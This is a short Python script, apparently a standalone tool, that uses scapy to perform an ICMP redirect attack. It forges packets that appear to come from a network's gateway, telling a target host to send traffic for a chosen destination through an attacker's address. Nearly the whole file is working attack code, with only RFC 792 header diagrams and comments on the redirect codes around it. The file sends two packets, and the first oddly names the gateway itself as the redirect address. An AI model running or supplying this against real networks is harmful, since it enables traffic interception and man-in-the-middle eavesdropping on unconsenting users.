from scapy.layers.inet import IP, ICMP, UDP
from scapy.sendrecv import send
import argparse


parser = argparse.ArgumentParser(description="Perform a simple ICMP redirect attack")
parser.add_argument('--target',         type=str, help="The IP address of the target who should add the routing table cache entry.")
parser.add_argument('--destination',    type=str, help="The IP address of the destination, the 'target' will insert a route for this IP via the 'attacker'.")
parser.add_argument('--gateway',        type=str, help="The IP address of the gateway which is used in the route entry.")
parser.add_argument('--attacker',       type=str, help="The IP address of the attacker.")
parser.add_argument('--redirect_code',  type=int, help="The redirect code from ICMP redirect RFC. Supports values 0, 1, 2, and 3. Default is 1 to redirect datagrams for the Host.", default=1)
args = parser.parse_args()


# http://blog.packetheader.net/2010/06/better-spoofing-of-icmp-host-redirect.html

# IP layer
ip     = IP()
ip.src = args.gateway
ip.dst = args.target
# https://datatracker.ietf.org/doc/html/rfc792
#    0                   1                   2                   3
#    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#   |     Type      |     Code      |          Checksum             |
#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#   |                 Gateway Internet Address                      |
#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#   |      Internet Header + 64 bits of Original Data Datagram      |
#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 #ICMP redirect codes 
 # 0 = Redirect datagrams for the Network. 
 # 1 = Redirect datagrams for the Host. 
 # 2 = Redirect datagrams for the Type of Service and Network. 
 # 3 = Redirect datagrams for the Type of Service and Host.
 
# ICMP Redirect layer
icmp      = ICMP()
icmp.type = 5
icmp.code = args.redirect_code  
icmp.gw   = args.gateway
#internet header payload
ip_payload     = IP()
ip_payload.src = args.target
ip_payload.dst = args.destination

# 'original data datagram' which is just scapy defaults for UDP(). Look similar to a DNS packet.
udp = UDP()

send(ip/icmp/ip_payload/udp)



send(IP(src=args.gateway, dst=args.target)/ICMP(type=5, code=args.redirect_code, gw=args.attacker)/IP(src=args.target, dst=args.destination)/UDP())